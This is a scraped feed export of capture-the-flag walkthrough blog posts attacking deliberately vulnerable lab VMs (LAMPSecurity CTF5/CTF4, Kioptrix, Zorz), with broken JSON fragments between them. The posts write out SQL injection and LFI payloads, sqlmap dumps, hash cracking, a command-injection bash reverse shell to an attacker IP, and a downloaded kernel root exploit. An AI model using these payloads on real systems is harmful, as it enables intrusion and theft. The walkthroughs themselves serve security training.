<p>N/A</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 138</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>netbios-ssn</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba smbd 3.X</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 143</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>IMAP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>University of Washington IMAP imapd</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 445</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>netbios-ssn</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba smbd 3.X (workgroup: MYGROUP)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP:901 </code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba SWAT administration server</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP:3306 </code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL 5.0.45</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP:36644 </code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP:36644 </code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Inspection of the Web Application revealed the blog used a URL path of <code>/~andy/</code>, indicating it was serving an Apache home dir - username enumeration is possible. Further inspection of the web application indicated the use of GET requests <code>/?page=contact</code>,</p> \n<h4 id=\"forced-browsing\">Forced Browsing</h4> \n<p>Dirbuster revealed the directory <code>/~andy/data/nanoadmin.php</code>, indicating the site used NanoCMS (this was confirmed by viewing the page source code).</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf5/dirbuster.png\" alt=\"OWASP DirBuster\" /></p> \n<h2 id=\"web-application-enumeration\">Web Application Enumeration</h2> \n<p>Viewing the web application disclosed the application used “NanoCMS”, this information was also previously discovered using Dirbuster. Research indicated a NanoCMS vulnerability existed that disclosed the applications password hashes. <a href=\"http://www.securityfocus.com/bid/34508/exploit\">http://www.securityfocus.com/bid/34508/exploit</a></p> \n<h3 id=\"hash-disclosure\">Hash Disclosure</h3> \n<p>Admin hases were successfully retrived using the discovered NanoCMS exploit:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf5/nanocms-vuln-hash.png\" alt=\"NanoCMS Hash Expose Vuln\" /></p> \n<h3 id=\"verified-hash-type\">Verified Hash Type</h3> \n<p>Hash Identifier was used to confirm the hash was md5.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf5/hash-identifier.png\" alt=\"Hash Identifier\" /></p> \n<h2 id=\"hashcat-md5-cracking\">Hashcat md5 cracking</h2> \n<p>Hashcat was used to crack the hash.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># hashcat -m 0 -a 0 ctf5-hash.txt /usr/share/wordlists/rockyou.txt</span></code></pre> \n</figure> \n<p>Discovered password: <code>9d2f75377ac0ab991d40c91fd27e52fd:shannon</code></p> \n<h2 id=\"web-application-exploitation\">Web Application Exploitation</h2> \n<p>Authentication was successful using the previously cracked hash credential. I new page was created containing php reverse shell code:</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf5/nanocms-webshell.png\" alt=\"NanoCMS PHP Reverse Shell\" /></p> \n<p>A netcat reverse handler was setup <code>nc -n -v -l -p 443</code>, the shell successfully connected back.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf5/rev-shell.png\" alt=\"php reverse shell\" /></p> \n<h2 id=\"linux-local-enumeration\">Linux Local Enumeration</h2> \n<p>Enumeration indicated <code>/home/</code> directories were readable.</p> \n<p>Grep’ing for the string <strong>password</strong> discovered the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-3.2<span class=\"nv\">$ </span><span class=\"nb\">grep</span> <span class=\"nt\">-R</span> <span class=\"nt\">-i</span> password /home/<span class=\"k\">*</span>\n\nDiscovered the file:\n\n/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;title&gt;Root\npassword&lt;/title&gt;\n/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;text\nxml:space<span class=\"o\">=</span><span class=\"s2\">\"preserve\"</span><span class=\"o\">&gt;</span>&lt;note-content <span class=\"nv\">version</span><span class=\"o\">=</span><span class=\"s2\">\"0.1\"</span><span class=\"o\">&gt;</span>Root password\n/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password</code></pre> \n</figure> \n<p>The file contained the root credentials.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>root</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>50$cent</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-3.2<span class=\"nv\">$ </span>su -\nstandard <span class=\"k\">in </span>must be a <span class=\"nb\">tty\n</span>sh-3.2<span class=\"nv\">$ </span>python <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/sh\")'</span>\nbash-3.2<span class=\"nv\">$ </span>su -\nsu -\nPassword: 50<span class=\"nv\">$cent</span>\n\n<span class=\"o\">[</span>root@localhost ~]# <span class=\"nb\">whoami\nwhoami\n</span>root\n<span class=\"o\">[</span>root@localhost ~]# <span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\n<span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,1<span class=\"o\">(</span>bin<span class=\"o\">)</span>,2<span class=\"o\">(</span>daemon<span class=\"o\">)</span>,3<span class=\"o\">(</span>sys<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,6<span class=\"o\">(</span>disk<span class=\"o\">)</span>,10<span class=\"o\">(</span>wheel<span class=\"o\">)</span>\n<span class=\"nv\">context</span><span class=\"o\">=</span>system_u:system_r:httpd_t:s0</code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Sat, 08 Feb 2014 12:00:59 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/ctf5/dirbuster.png","linkMd5":"6e6c28a2ee70f3f6211b5f75f0cc780d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn12@2020_1/2020/08/25/01-24-54-510_3f7fcade60efaa5a.webp","destWidth":709,"destHeight":674,"sourceBytes":36789,"destBytes":46120,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/ctf5/dirbuster.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn12@2020_1/2020/08/25/01-24-54-510_3f7fcade60efaa5a.webp","https://highon.coffee/img/blog/ctf5/nanocms-vuln-hash.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn16@2020_1/2020/08/25/01-25-14-391_6e07f6c0dc03732f.webp","https://highon.coffee/img/blog/ctf5/hash-identifier.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn91@2020_4/2020/08/25/01-25-15-927_e8f91e2954f2a088.webp","https://highon.coffee/img/blog/ctf5/nanocms-webshell.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn72@2020_4/2020/08/25/01-25-15-733_3c44c63021956274.webp","https://highon.coffee/img/blog/ctf5/rev-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn44@2020_3/2020/08/25/01-25-14-701_a1aca5114ada7cdb.webp"},"publishedOrCreatedDate":1598318675558},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"LAMP Security CTF4 - Walkthrough","link":"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/","description":"<div href=\"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/#sqlmap\" id=\"markdown-toc-sqlmap\">SQLMap</a></li> \n   <li><a href=\"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/#sqlmap-dump-hahes--crack-hashes\" id=\"markdown-toc-sqlmap-dump-hahes--crack-hashes\">SQLMap Dump Hahes + Crack hashes</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/#ssh-login\" id=\"markdown-toc-ssh-login\">SSH Login</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/#linux-local-privilege-escalation\" id=\"markdown-toc-linux-local-privilege-escalation\">Linux Local Privilege Escalation</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf4-walkthrough/#post-exploitation-enumeration\" id=\"markdown-toc-post-exploitation-enumeration\">Post Exploitation Enumeration</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises (not just the latest one). Check the SourceForge site to find other exercises available (http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/).</p> \n<p><strong>Author:</strong> madirish2600</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.147</code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>Dislcaimer: Multiple Entry Points</h5> \n <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p> \n</div> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 4.3 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 25</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SMTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Sendmail 8.13.5/8.13.5</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTPD</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.0 ((Fedora))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Inspection of the Web Application revealed the blog used GET requests.</p> \n<h4 id=\"lfi-exploit\">LFI Exploit</h4> \n<p>The string <code>index.html?page=../../../../../../etc/passwd%00</code> exposed the contents on the unix passwd file.</p> \n<p><img src=\"https://highon.coffee/img/blog/ctf4/LFI.png\" alt=\"OWASP DirBuster\" /></p> \n<p>RFI did not appear possible.</p> \n<h2 id=\"sqlmap-enumeration\">SQLMap Enumeration</h2> \n<p>SQLMap was leveraged to enumerate, inject and dump the MySQL databases on the target.</p> \n<h3 id=\"sqlmap\">SQLMap</h3> \n<p>Using the GET ‘id’ as the injection point, the following SQLMap command was used to successfully list tables for all databases on the target system.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sqlmap <span class=\"nt\">-u</span> <span class=\"s2\">\"http://192.168.30.147/index.html?page=blog&amp;title=Blog&amp;id=2\"</span> <span class=\"nt\">-p</span> <span class=\"nb\">id</span> <span class=\"nt\">--tables</span></code></pre> \n</figure> \n<p>Full SQLMap Command Output:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">_\n___ ___| |_____ ___ ___  <span class=\"o\">{</span>1.0-dev-nongit-0826<span class=\"o\">}</span>\n|_ -| <span class=\"nb\">.</span> | |     | .<span class=\"s1\">'| . |\n|___|_  |_|_|_|_|__,|  _|\n|_|           |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. id=\"sqlmap-dump-hahes--crack-hashes\">SQLMap Dump Hahes + Crack hashes</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sqlmap <span class=\"nt\">-u</span> <span class=\"s2\">\"http://192.168.30.147/index.html?page=blog&amp;title=Blog&amp;id=2\"</span> <span class=\"nt\">-p</span> <span class=\"nb\">id</span> <span class=\"nt\">-D</span> ehks <span class=\"nt\">-T</span> user  <span class=\"nt\">--dump</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">_\n___ ___| |_____ ___ ___  <span class=\"o\">{</span>1.0-dev-nongit-0826<span class=\"o\">}</span>\n|_ -| <span class=\"nb\">.</span> | |     | .<span class=\"s1\">'| . |\n|___|_  |_|_|_|_|__,|  _|\n|_|           |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. from stored session:\n<span class=\"nt\">---</span>\nParameter: <span class=\"nb\">id</span> <span class=\"o\">(</span>GET<span class=\"o\">)</span>\nType: boolean-based blind\nTitle: AND to text files under <span class=\"s1\">'/root/.sqlmap/output/192.168.30.147'</span></code></pre> \n</figure> \n<h2 id=\"ssh-login\">SSH Login</h2> \n<p>All the dumped accounts appeared to have matching SSH accounts sharing the same credentials as the vulnerable web application.</p> \n<h2 id=\"linux-local-privilege-escalation\">Linux Local Privilege Escalation</h2> \n<p>The account <code>achen</code> was a memeber of the sudo group.</p> \n<p>The command <code>sudo -s</code> was executed, successfully escalating privileges to super user.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>achen@ctf4 ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n<span class=\"o\">[</span>root@ctf4 ~]# <span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,1<span class=\"o\">(</span>bin<span class=\"o\">)</span>,2<span class=\"o\">(</span>daemon<span class=\"o\">)</span>,3<span class=\"o\">(</span>sys<span class=\"o\">)</span>,4<span class=\"o\">(</span>adm<span class=\"o\">)</span>,6<span class=\"o\">(</span>disk<span class=\"o\">)</span>,10<span class=\"o\">(</span>wheel<span class=\"o\">)</span> <span class=\"nv\">context</span><span class=\"o\">=</span>user_u:system_r:unconfined_t:SystemLow-SystemHigh\n<span class=\"o\">[</span>root@ctf4 ~]# <span class=\"nb\">cat</span> /root/</code></pre> \n</figure> \n<h2 id=\"post-exploitation-enumeration\">Post Exploitation Enumeration</h2> \n<p>There appears to be no root flag, for this capture the flag challenge.</p> \n<p>Additionally <code>.bash_history</code> contained the root password:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>achen@ctf4 ~]<span class=\"nv\">$ </span><span class=\"nb\">cat</span> .bash_history\n<span class=\"nb\">exit\n</span>clear\n<span class=\"nb\">exit\nsudo </span>sy\nsu\nroot1234\nsu\n<span class=\"nb\">exit</span></code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Fri, 10 Jan 2014 18:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/ctf4/LFI.png","linkMd5":"c140f2adf5852cbffe9dde620b6f0792","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn84@2020_1/2020/08/25/01-24-54-523_fa86129affbb3288.webp","destWidth":1185,"destHeight":565,"sourceBytes":103896,"destBytes":146688,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/ctf4/LFI.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn84@2020_1/2020/08/25/01-24-54-523_fa86129affbb3288.webp"},"publishedOrCreatedDate":1598318675559},{"createdTime":"2020-08-25 \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local privilege Escalation</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p> \n<h2 id=\"service-enumeration\">Service Enumeration</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 3.9p1 (protocol 1.99)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.0.52 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 111</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC Bind</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>N/A</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 443</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTPS</p> \n     </pc> </td> \n <pc> \n      <p>CUPS</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>CUPS 1.1</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 946</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 3306</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>MySQL (unauthorized)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-investigation\">Web Application Investigation</h2> \n<p>The web form <code>/index.php</code> was vulnerable to SQL injection, entering the username <code>admin</code> and the password <code>' or '1'=' </code> successfully bypassed auth.</p> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/sql-injection-1-1.png\" alt=\"SQL Injection Auth Bypass\" /></p> \n<div class=\"note info\"> \n <h5>SQL Injection - Why does ' or '1'='1 work ?</h5> \n <p> The web application is expecting the SQL query: <code>$query = \"SELECT * FROM users WHERE username = 'admin' AND password='blah'\";</code> Entering the above <b>injects</b> the statement after the <code>password='blah'</code> and before the closing <code>\";</code>, the entire sql injection query looks like: <code>$query = \"SELECT * FROM users WHERE username = 'admin' AND password=' or '1'='1\";\"</code> <code>1 = 1</code> will always be <code>1</code>, thus the statement will return true, allowing an attacker to authenticate as admin. The above injection statement correctly closes the sql syntax, however it is possible to comment out the rest of the sql statement using: <code> -- -</code> </p> \n</div> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/command-injection.png\" alt=\"Command Injection\" /></p> \n<p>The above authentication bypass exposed a web form vulnerable to <b>command injection</b>, the form filtering only checks for the presence of the ping command with no filtering to prevent an attacker tacking a comment on the end using <code>; insert-command-here</code>.</p> \n<h2 id=\"non-privileged-shell\">Non privileged shell</h2> \n<p>A non privileged reverse shell was obtained using:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">ping google.com<span class=\"p\">;</span> bash <span class=\"nt\">-i</span> <span class=\"o\">&gt;</span>&amp; /dev/tcp/192.168.221.139/443 0&gt;&amp;1</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443\nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>192.168.221.139] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.157] 32770\nbash: no job control <span class=\"k\">in </span>this shell\nbash-3.00<span class=\"nv\">$ </span><span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span>\nbash-3.00<span class=\"err\">$</span></code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local privilege Escalation</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">bash-3.00<span class=\"nv\">$ </span><span class=\"nb\">uname</span> <span class=\"nt\">-ar</span>\nLinux kioptrix.level2 2.6.9-55.EL <span class=\"c\">#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span>\nbash-3.00<span class=\"nv\">$ </span><span class=\"nb\">cd</span> /tmp\nbash-3.00<span class=\"nv\">$ </span>wget https://www.exploit-db.com/download/9545 <span class=\"nt\">--no-check-certificate</span>\n<span class=\"nt\">--02</span>:27:58--  https://www.exploit-db.com/download/9545\n           <span class=\"o\">=&gt;</span> <span class=\"sb\">`</span>9545<span class=\"s1\">'\nResolving www.exploit-db.com... 192.124.249.8\nConnecting to www.exploit-db.com|192.124.249.8|:443... connected.\nWARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate\nWARNING: certificate common name `*.mycloudproxy.com'</span> doesn<span class=\"s1\">'t match requested host name `www.exploit-db.com'</span><span class=\"nb\">.</span>\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified <span class=\"o\">[</span>application/txt]\n\n    0K .........                                                30.10 MB/s\n\n02:27:58 <span class=\"o\">(</span>30.10 MB/s<span class=\"o\">)</span> - <span class=\"sb\">`</span>9545<span class=\"s1\">' saved [9785]\n\nbash-3.00$ mv 9545 sock_sendpage.c                             \nbash-3.00$ gcc -o sock_sendpage sock_sendpage.c\nbash-3.00$ ./sock_sendpage\nsh: no job control in this shell\nsh-3.00# id\nuid=0(root) gid=0(root) groups=48(apache)\nsh-3.00#</span></code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Fri, 20 Dec 2013 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/kioptrix/sql-injection-1-1.png","linkMd5":"7928a262b28923337bf9353d9c7d2bd1","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn83@2020_3/2020/08/25/01-24-54-292_8e5da785c94a5c04.webp","destWidth":577,"destHeight":267,"sourceBytes":9490,"destBytes":6456,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/kioptrix/sql-injection-1-1.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn83@2020_3/2020/08/25/01-24-54-292_8e5da785c94a5c04.webp","https://highon.coffee/img/blog/kioptrix/command-injection.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn92@2020_6/2020/08/25/01-25-14-517_b9258fee68c95937.webp"},"publishedOrCreatedDate":1598318675558},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Zorz Walkthrough","link":"https://highon.coffee/blog/zorz-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n id=\"markdown-toc-level-2\">Level 2</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/zorz-walkthrough/#burp-suite---php-shell-injection-in-an-image-file\" href=\"https://highon.coffee/blog/zorz-walkthrough/#level-3\" id=\"markdown-toc-level-3\">Level 3</a></li> \n <li><a href=\"https://highon.coffee/blog/zorz-walkthrough/#flag\" id=\"markdown-toc-flag\">Flag</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>Welcome to the ZorZ VM Challenge</p> \n<p>This machine will probably test your web app skills once again. There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge. Your goal is to successfully upload a webshell or malicious file to the server. If you can execute system commands on this box, thats good enough!!! I hope you have fun!</p> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 10.0.1.110</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.4.7 ((Ubuntu))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Enumeration of port 80, discovered <code>login.php</code>:</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/dirbuster.png\" alt=\"dirbuster\" /></p> \n<h2 id=\"level-1\">Level 1</h2> \n<p>The web application has no filter protection, so uploading a PHP shell is possible.</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/uploader1.png\" alt=\"uploader1\" /></p> \n<p>PHP Shell Upload:</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/file-upload.png\" alt=\"php shell upload\" /></p> \n<p>The location <code>/uploads2</code> was previously disclosed by <strong>Dirbuster</strong>, <code>/uploads1</code> was discovered manually (logical guess).</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/uploads1.png\" alt=\"php shell execution\" /></p> \n<p>Reverse shell:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443                               \nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>10.0.1.110] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.0.1.111] 33115\nLinux zorz 3.13.0-45-generic <span class=\"c\">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span>\n 16:21:31 up 1 min,  0 <span class=\"nb\">users</span>,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n<span class=\"nv\">uid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span>\n/bin/sh: 0: can<span class=\"s1\">'t access tty; job control turned off\n$ whoami\nwww-data\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$</span></code></pre> \n</figure> \n<p>Level 1 complete.</p> \n<h2 id=\"level-2\">Level 2</h2> \n<p>The initial attempt to upload the previous shell failed with the error message:</p> 